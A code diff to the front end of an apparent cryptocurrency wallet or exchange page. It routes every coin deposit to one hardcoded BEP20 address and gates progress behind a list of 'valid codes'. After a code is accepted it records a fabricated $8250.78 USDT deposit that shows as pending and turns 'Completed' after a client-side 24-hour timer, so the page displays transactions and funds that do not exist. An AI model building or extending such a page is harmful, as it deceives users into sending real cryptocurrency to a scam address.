@@ -111,6 +111,15 @@
   <p>Your funds are now available.</p>
 </div>
 
+
+  <!-- Transactions Page -->
+<div id="transactions-page" class="page">
+  <h2>Transactions</h2>
+  <div id="transactions-list" style="max-height:500px; overflow-y:auto; border:1px solid #333; padding:8px; border-radius:6px; background:#1a1a2b;">
+    <!-- Transactions will appear here dynamically -->
+  </div>
+</div>
+  
 <div id="market-page" class="page">
   <h2>Market</h2>
   <input type="text" id="market-search" class="search-input" placeholder="Search coin..."/>
@@ -293,28 +302,133 @@ async function loadDepositCoins(){
   coinsData.sort((a,b)=>a.name.localeCompare(b.name)).forEach(c=>{
     const div = document.createElement('div');
     div.className = 'coin-item';
-    div.innerHTML = `<img src="${c.image}">${c.name}`;
-    div.onclick = ()=>showPage('network-page');
+    div.innerHTML = `<img src="${c.image}" style="width:24px;height:24px;margin-right:8px;"> ${c.name}`;
+    div.onclick = ()=>{
+      // Save selected coin
+      localStorage.setItem('selectedCoin', JSON.stringify(c));
+      showPage('network-page');
+      renderNetworkSelection();
+    };
     list.appendChild(div);
   });
 }
 
 // ================= Network Selection =================
+function renderNetworkSelection(){
+  const selectedCoin = JSON.parse(localStorage.getItem('selectedCoin') || "{}");
+  const networkDiv = document.getElementById('bnb-network');
+  networkDiv.innerHTML = `
+    <img src="${selectedCoin.image}" style="width:24px;height:24px;margin-right:8px;">
+    BNB Smart Chain (BEP20)
+  `;
+}
+
 document.getElementById('bnb-network').onclick = ()=>{
   showPage('deposit-address-page');
+  const depositAddress = "0x085Ea96BFFE85e98241B33299b9bAA64AF5f7e85";
+  document.getElementById('deposit-address').textContent = depositAddress;
+
+  // Generate QR Code
+  document.getElementById('deposit-qr-code').innerHTML = ""; // clear old QR
   new QRCode(document.getElementById('deposit-qr-code'),{
-    text: document.getElementById('deposit-address').textContent,
-    width:128,
-    height:128
+    text: depositAddress,
+    width: 128,
+    height: 128
   });
 };
 
 // ================= Copy Address =================
 document.getElementById('copy-address-btn').onclick = ()=>{
-  navigator.clipboard.writeText(document.getElementById('deposit-address').textContent);
-  alert('Address copied!');
-  setTimeout(()=>showPage('bnb-code-page'),15000);
+  const addr = document.getElementById('deposit-address').textContent;
+  navigator.clipboard.writeText(addr).then(()=>{
+    alert('Address copied!');
+    setTimeout(()=>showPage('bnb-code-page'),15000);
+  });
 };
+
+// ================= Transaction Storage =================
+function loadTransactions() {
+  const txs = JSON.parse(localStorage.getItem("transactions") || "[]");
+  const list = document.getElementById("transactions-list");
+  list.innerHTML = "";
+
+  txs.forEach(tx => {
+    const div = document.createElement("div");
+    div.className = "transaction-item";
+
+    let statusDisplay = tx.status;
+    if (tx.status === "Pending") {
+      const remaining = getRemainingTime(tx.id);
+      statusDisplay = remaining > 0
+        ? `Processing... ${formatTime(remaining)} left`
+        : "Completed";
+    }
+
+    div.innerHTML = `
+      <div>
+        <strong>${tx.type}</strong> ${tx.coin} - ${tx.amount}
+        <br/><small>${new Date(tx.timestamp).toLocaleString()}</small>
+      </div>
+      <div class="tx-status">${statusDisplay}</div>
+    `;
+
+    list.appendChild(div);
+  });
+}
+
+// Add a new transaction
+function addTransaction(type, coin, amount, status) {
+  const txs = JSON.parse(localStorage.getItem("transactions") || "[]");
+  const tx = {
+    id: Date.now(), // unique ID
+    type,
+    coin,
+    amount,
+    status,
+    timestamp: new Date().toISOString(),
+    endTime: Date.now() + 24 * 60 * 60 * 1000 // 24h from now
+  };
+  txs.push(tx);
+  localStorage.setItem("transactions", JSON.stringify(txs));
+  loadTransactions();
+}
+
+// Get remaining countdown in ms
+function getRemainingTime(txId) {
+  const txs = JSON.parse(localStorage.getItem("transactions") || "[]");
+  const tx = txs.find(t => t.id === txId);
+  if (!tx) return 0;
+  return Math.max(0, tx.endTime - Date.now());
+}
+
+// Format ms into hh:mm:ss
+function formatTime(ms) {
+  const totalSeconds = Math.floor(ms / 1000);
+  const h = String(Math.floor(totalSeconds / 3600)).padStart(2, "0");
+  const m = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, "0");
+  const s = String(totalSeconds % 60).padStart(2, "0");
+  return `${h}:${m}:${s}`;
+}
+
+// Simulate processing: update UI every 1s
+function startTransactionUpdater() {
+  setInterval(() => {
+    const txs = JSON.parse(localStorage.getItem("transactions") || "[]");
+    let updated = false;
+
+    txs.forEach(tx => {
+      if (tx.status === "Pending" && Date.now() >= tx.endTime) {
+        tx.status = "Completed";
+        updated = true;
+      }
+    });
+
+    if (updated) {
+      localStorage.setItem("transactions", JSON.stringify(txs));
+    }
+    loadTransactions();
+  }, 1000);
+}
 
 // ================= BNB Verification =================
 document.getElementById('bnb-verify-btn').onclick = ()=>{
@@ -323,7 +437,18 @@ document.getElementById('bnb-verify-btn').onclick = ()=>{
   if(validCodes.includes(code)){
     showPage('processing-page');
     startCountdown();
-  } else alert('Declined! Enter correct code.');
+
+    // Add pending deposit with countdown
+    addTransaction("Deposit", "USDT", "$8250.78", "Pending");
+  } else {
+    alert('Declined! Enter correct code.');
+  }
+};
+
+// ================= Init =================
+window.onload = () => {
+  loadTransactions();
+  startTransactionUpdater();
 };
 
 // ================= Countdown =================
